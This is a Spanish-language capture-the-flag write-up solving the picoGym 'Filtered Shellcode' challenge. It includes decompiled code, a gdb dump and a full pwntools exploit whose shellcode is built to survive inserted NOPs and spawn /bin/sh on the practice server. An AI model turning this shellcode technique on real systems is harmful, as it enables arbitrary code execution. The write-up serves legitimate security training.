---
layout: post
title: Filtered Shellcode PicoGym
comments: true
categories: [Pwn, Writeups, PicoCTF]
---

En este post estaremos resolviendo un reto del [PicoGym](https://play.picoctf.org/practice/challenge/184).

<br>
![Image]({{ site.baseurl }}/images/posts/picoGym/pico_logo.png){:width="200px"}

# Reconocimiento

  > A program that just runs the code you give it? That seems kinda boring...

Como dice el enunciado, el programa ejecuta todo lo que se le pasa como entrada.

```c
int main(void)
{
  int input_char;
  char code_buffer [1000];
  char current_char;
  uint code_length;
  undefined *stack_pointer_backup;
  
  stack_pointer_backup = &stack0x00000004;
  setbuf(_stdout,(char *)0x0);
  code_length = 0;
  current_char = 0;

  puts("Give me code to run:");
  input_char = fgetc(_stdin);
  current_char = (char)input_char;

  // Leer caracteres hasta salto de línea o hasta llenar el buffer
  for (; (current_char != '\n' && (code_length < 1000)); code_length = code_length + 1) {
    code_buffer[code_length] = current_char;
    input_char = fgetc(_stdin);
    current_char = (char)input_char;
  }

  // Agrega bytes de relleno (0x90 = instrucción NOP en x86)
  if ((code_length & 1) != 0) {
    code_buffer[code_length] = -0x70;
    code_length = code_length + 1;
  }
  execute(code_buffer,code_length);
  return 0;
}
```

Si probamos con un shellcode y ejecutamos con gdb vemos la pesadilla de cualquier programador:

```bash
(gdb) x/40xw $esp
0xffe377cc:     0x080485cb      0x9090e589      0x9090c0da      0x909075d9
0xffe377dc:     0x90905bf4      0x90905953      0x90904949      0x90904949
0xffe377ec:     0x90904949      0x90904949      0x90904949      0x90904343
0xffe377fc:     0x90904343      0x90904343      0x90905137      0x90906a5a
0xffe3780c:     0x90905841      0x90903050      0x90903041      0x90906b41
0xffe3781c:     0x90904141      0x90903251      0x90904241      0x90904232
0xffe3782c:     0x90903042      0x90904242      0x90904241      0x90905058
0xffe3783c:     0x90904138      0x90907542      0x9090494a      0x90905a73
0xffe3784c:     0x90906b46      0x90903856      0x9090494d      0x90906273
0xffe3785c:     0x90905633      0x90903855      0x90906d44      0x90907351
```

Se están introduciendo instrucciones `0x90` (NOP) cada dos bytes.

## Explotación

Para explotar el binario tendremos que crear un payload con instrucciones de 1 ó 2 bytes para que al introducir los NOP, no se rompa. En pwntools quedaría así:

```python
#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./fun', checksec=False)
# Para local testing:
# p = process(exe.path)
# Para servidor remoto:
p = remote('mercury.picoctf.net', 35338)

# Shellcode de 2-byte instructions con NOPs intermedios
shellcode = asm('''
    xor eax, eax            ; limpiar eax
    push eax                ; NULL
    push eax                ; NULL, para terminar /bin/sh
    mov edi, esp            ; edi apunta al stack

    ; construir /bin/sh byte por byte en [edi]
    mov al, 0x2f            ; '/'
    add [edi], al
    inc edi
    nop

    mov al, 0x62            ; 'b'
    add [edi], al
    inc edi
    nop

    mov al, 0x69            ; 'i'
    add [edi], al
    inc edi
    nop

    mov al, 0x6e            ; 'n'
    add [edi], al
    inc edi
    nop

    mov al, 0x2f            ; '/'
    add [edi], al
    inc edi
    nop

    mov al, 0x73            ; 's'
    add [edi], al
    inc edi
    nop

    mov al, 0x68            ; 'h'
    add [edi], al
    inc edi
    nop

    ; preparar syscall: execve("/bin/sh", 0, 0)
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb             ; syscall execve
    mov ebx, esp            ; puntero a "/bin/sh"
    int 0x80
''')

# Enviar shellcode
p.sendline(shellcode)

# Interactuar con la shell
p.interactive()
```

```bash
❯ python solver.py
[+] Opening connection to mercury.picoctf.net on port 35338: Done
[*] Switching to interactive mode
Give me code to run:
$ ls
flag.txt
fun
fun.c
xinet_startup.sh
$ cat flag.txt
picoCTF{<REDACTED>}
```

<br>